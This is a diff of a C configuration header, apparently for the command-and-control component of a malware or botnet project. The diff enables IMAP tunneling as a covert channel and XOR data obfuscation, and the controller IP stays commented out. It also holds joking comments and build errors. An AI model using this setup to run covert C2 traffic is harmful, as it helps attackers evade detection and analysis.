@@ -8,7 +8,7 @@
 
 // DEFAULT SETTINGS
 // IMAP tunneling
-// XOR encryption (if you'd even call it that) (key is 'l')
+// XOR encryption (if you'd even call it encryption) (key is 'l')
 // Controller IP is not set by default (it's commented out)
 
 #ifndef __CNC_CONFIG_H
@@ -18,6 +18,8 @@
  *** Host IP ***
  ***************/
 
+// VERY IMPORTANT
+// HOPEFULLT THE CAPS WILL MAKE THIS MORE NOTICEABLE.
 //#define CNC_CONFIG_CONTROLLER_IP "4.20.6.9"
 
 /****************************
@@ -29,8 +31,8 @@
 //#define CNC_CONFIG_PROTOCOL_DNS
 
 // IMAP Tunneling
-// Never heard of it? Correct, you haven't.
-//#define CNC_CONFIG_PROTOCOL_IMAP
+// Never heard of it? Neither have they.
+#define CNC_CONFIG_PROTOCOL_IMAP
 
 /************************
  *** Data Obfuscation ***
@@ -38,7 +40,10 @@
 
 // XOR encryption
 // Yeah, it's kind of meh... whatever
-//#define CNC_CONFIG_DATA_XOR 'l' // change key however
+#define CNC_CONFIG_DATA_XOR 'l' // change key however
+
+// The obfuscation options below are hypothetical, and might never
+// make it into the program.
 
 // AES256 with pre-defined key
 // Makes an AES256 key with SHA256 on a passphrase. Gives REs a run
@@ -46,7 +51,7 @@
 //#define CNC_CONFIG_DATA_AES256_KEY "thisIsOurKey"
 
 // AES256 with a Diffie-Hellman implementation
-// Kinda legit... very bulky. Currently just a hypothetical.
+// Kinda legit... very bulky.
 //#define CNC_CONFIG_DATA_AES256_DIFFIE_HELLMAN
 
 /**************************************
@@ -54,22 +59,23 @@
  **************************************/
 
 #if !defined(CNC_CONFIG_PROTOCOL_DNS) && !defined(CNC_CONFIG_PROTOCOL_IMAP)
-#  warning "CNC protocol not configured - see src/CNC_host/config.h"
+#  warning "CNC protocol not configured - see src/cnc/config.h"
 #  define NOT_CONFIGURED
 #endif
 
 #if !defined(CNC_CONFIG_DATA_XOR) && !defined(CNC_CONFIG_DATA_AES256_KEY) && !defined(CNC_CONFIG_DATA_AES256_DIFFIE_HELLMAN)
-#  warning "CNC data obfuscation not configured - see src/CNC_host/config.h"
+#  warning "CNC data obfuscation not configured - see src/cnc/config.h"
 #  define NOT_CONFIGURED
 #endif
 
 #if !defined(CNC_CONFIG_CONTROLLER_IP)
-#  warning "CNC controller IP not defined - see src/CNC_host/config.h"
+#  warning "CNC controller IP not defined - see src/cnc/config.h"
 #  define NOT_CONFIGURED
 #endif
 
 #ifdef NOT_CONFIGURED
-#  error "Did you even read the readme?"
+#  warning "Did you even read the readme?"
+#  error "You're a dumbass." // lol
 #endif
 
 #endif /* __CNC_CONFIG_H */
